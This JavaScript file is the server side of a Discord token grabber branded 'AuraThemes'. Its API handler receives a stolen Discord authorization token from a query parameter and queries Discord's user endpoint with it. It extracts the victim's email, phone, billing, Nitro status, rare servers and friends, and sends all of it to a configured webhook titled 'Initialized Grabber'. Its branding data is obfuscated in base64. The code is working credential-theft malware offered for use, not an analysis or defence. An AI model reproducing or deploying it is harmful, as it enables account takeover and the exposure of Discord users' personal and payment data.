import { EmbedBuilder, WebhookClient } from 'discord.js';
import DiscordToken from 'discord.js-token';
import k4itrunConfig from '../../../../k4itrun.config'

const webhook = new WebhookClient({
  url: k4itrunConfig.webhook,
});

const EMBED_COLORS = {
  raw: '#c267ff',
  initialized: '#c267ff',
};

export default async function handler(req, res) {
  try {
    const { query } = req;
    if (!query.data) {
      res.status(400).send('Bad Request: Missing "data" query parameter');
      return;
    }

    const { data } = query;
    const embed = await getEmbed();
    const response = await fetch('https://discord.com/api/v9/users/@me', {
      headers: {
        authorization: data,
      },
    });

    const info = await response.json();

    console.log(info);

    const Discord = DiscordToken(data).all;
    const embedBuilder = Discord.token
      ? buildInitializedEmbed(Discord, data, embed)
      : buildRawEmbed(data, embed);

    await webhook.send({
      embeds: [embedBuilder],
      username: '@AuraThemes',
      avatarURL: embed.avatar,
    });
    res.status(200).send(data);
  } catch (error) {
    console.error('Error:', error);
    res.status(500).send('Internal Server Error');
  }
}

function getField(a = null, b = null, c = false) {
  let name = a;
  let value = b;
  let inline = c;
  if (!name || name.length < 1) name = '-';
  if (!value || value.length < 1) value = '-';
  return { name, value, inline };
}

function buildRawEmbed(data, embed) {
  const rawEmbed = new EmbedBuilder()
    .setAuthor({ name: 'AuraThemes' })
    .setColor(EMBED_COLORS.raw)
    .setTitle('raw')
    .addFields(getField('New visit lmao', `\`\`\`${data}\`\`\``))
    .setFooter({ text: 'AuraThemes API', iconURL: embed.footericon })
    .setTimestamp();
  return rawEmbed;
}

function buildInitializedEmbed(Discord, data, embed) {
  const initializedEmbed = new EmbedBuilder()
    .setAuthor({ name: `${Discord.username} | ${Discord.ID}`, iconURL: Discord.avatar })
    .setThumbnail(Discord.avatar)
    .setColor(EMBED_COLORS.initialized)
    .setTitle('Initialized Grabber')
    .addFields(
      getField('<a:aura:1087044506542674091> Token:', `\`\`\`${data}\`\`\``, false),
      getField('\u200b', "\u200b", false),
      getField('<a:aura:1101739920319590420> Nitro:', Discord.nitroType, true),
      getField('<a:aura:863691953531125820> Phone', `\`${Discord.phone}\``, true),
      getField('<:aura:974711605927505990> Email', `\`${Discord.mail}\``, false),
      getField('\u200b', "\u200b", false),
      getField('Badges', Discord.badges, true),
      getField('Billing', Discord.billing, false),
      getField('Langue', Discord.langue, false),
      getField('\u200b', "\u200b", false),
      getField('\u200b', '**Rare Servers**\n' + Discord.guilds, true),
      getField('\u200b', "\u200b", false),
      getField('\u200b', '**Rare Friends**\n' + Discord.friends, true)
    )
    .setFooter({ text: 'AuraThemes Grabber', iconURL: embed.footericon })
    .setTimestamp();
  return initializedEmbed;
}

async function getEmbed() {
  const embed = JSON.parse(
    Buffer.from(
      'eyJkaXNjb3JkIjoiaHR0cHM6Ly9kaXNjb3JkLmdnLzdoNUREVXAyeUMiLCJhdmF0YXJfdXJsIjoiaHR0cHM6Ly9pLmltZ3VyLmNvbS95Vm5PU2VTLmdpZiIsImZvb3Rlcl91cmwiOiJodHRwczovL2kuaW1ndXIuY29tL0NlRnFKT2MuZ2lmIn0=',
      'base64'
    ).toString('utf-8')
  );
  return {
    avatar: embed.avatar_url,
    url: embed.discord,
    footericon: embed.footer_url,
  };
}
